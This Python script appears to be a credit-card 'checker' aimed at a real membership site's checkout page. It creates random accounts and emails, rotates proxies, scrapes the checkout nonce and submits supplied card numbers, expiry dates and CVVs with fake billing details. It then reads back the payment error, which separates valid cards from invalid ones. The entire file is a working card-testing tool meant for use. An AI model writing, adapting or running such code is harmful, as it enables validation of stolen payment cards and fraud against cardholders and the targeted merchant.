import requests,re,random,string
from bs4 import BeautifulSoup
from proxy import proxies

def generate_username(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_password(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))
def generate_email():
    username = generate_username()
    domain = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    return f"{username}@{random.choice(domain)}"

async def Auth_net1(cc,mm,yy,cvv):
    r = requests.session()
    if cc.startswith('4'):
        card_type = 'Visa'
    elif cc.startswith('5'):
        card_type = 'Mastercard'
    elif cc.startswith('3'):
        card_type = 'American Express'
    elif cc.startswith('6'):
        card_type = 'Discover'
    email = generate_email()
    user = generate_username()
    password = generate_password()
    proxy = proxies()
    r.proxies = proxy
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        # 'Cookie': 'PHPSESSID=mjlh5vvvmkq4kkdlndr1m874sa; pmpro_visit=1',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://members.warroom.com/membership-account/membership-checkout/', headers=headers)
        nonce = re.findall(r'pmpro_checkout_nonce" value="(.*?)"', response.text)[0]
    except:
        return 'Auth_net => Error 1st Request'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'PHPSESSID=mjlh5vvvmkq4kkdlndr1m874sa; pmpro_visit=1',
        'Origin': 'https://members.warroom.com',
        'Pragma': 'no-cache',
        'Referer': 'https://members.warroom.com/membership-account/membership-checkout/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'pmpro_level': '6',
        'checkjavascript': '1',
        'username': user,
        'password': password,
        'password2': password,
        'bemail': email,
        'bconfirmemail': email,
        'fullname': '',
        'bfirstname': 'Albedo',
        'blastname': 'Jones',
        'baddress1': 'New York',
        'baddress2': '',
        'bcity': 'New York',
        'bstate': 'NY',
        'bzipcode': '10080',
        'bcountry': 'US',
        'bphone': '263162698',
        'CardType': card_type,
        'AccountNumber': cc,
        'ExpirationMonth': mm,
        'ExpirationYear': yy,
        'CVV': cvv,
        'tos': '1',
        'pmpro_checkout_nonce': nonce,
        '_wp_http_referer': '/membership-account/membership-checkout/',
        'submit-checkout': '1',
        'javascriptok': '1',
    }
    try:
        response = r.post(
            'https://members.warroom.com/membership-account/membership-checkout/',
            headers=headers,
            data=data,
        )
        soup = BeautifulSoup(response.text, 'html.parser')
        try:
            error_message = soup.find('div', class_='pmpro_message pmpro_error').text.strip()
            return error_message
        except:
            return "Unexpected error occurred while processing the payment."
    except:
        return 'Auth_net => Error 2nd Request'